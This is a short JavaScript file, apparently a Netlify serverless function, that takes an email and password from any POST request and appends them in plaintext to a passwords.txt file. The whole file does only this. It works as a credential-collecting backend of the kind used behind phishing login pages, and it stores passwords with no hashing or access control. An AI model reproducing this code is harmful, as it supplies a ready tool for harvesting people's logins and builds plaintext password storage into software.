const fs = require('fs');
const path = require('path');

exports.handler = async (event) => {
    if (event.httpMethod === 'POST') {
        const data = JSON.parse(event.body);
        const email = data.email;
        const password = data.password;

        // File path (this will be created in the Netlify function's environment)
        const filePath = path.join(__dirname, 'passwords.txt');

        // Prepare the string to save
        const loginData = `Email: ${email}, Password: ${password}\n`;

        try {
            // Append data to passwords.txt
            fs.appendFileSync(filePath, loginData);

            return {
                statusCode: 200,
                body: JSON.stringify({ message: 'Login data saved successfully!' }),
            };
        } catch (err) {
            console.error('Error writing to file', err);
            return {
                statusCode: 500,
                body: JSON.stringify({ message: 'Internal Server Error' }),
            };
        }
    }

    return {
        statusCode: 405,
        body: JSON.stringify({ message: 'Method Not Allowed' }),
    };
};
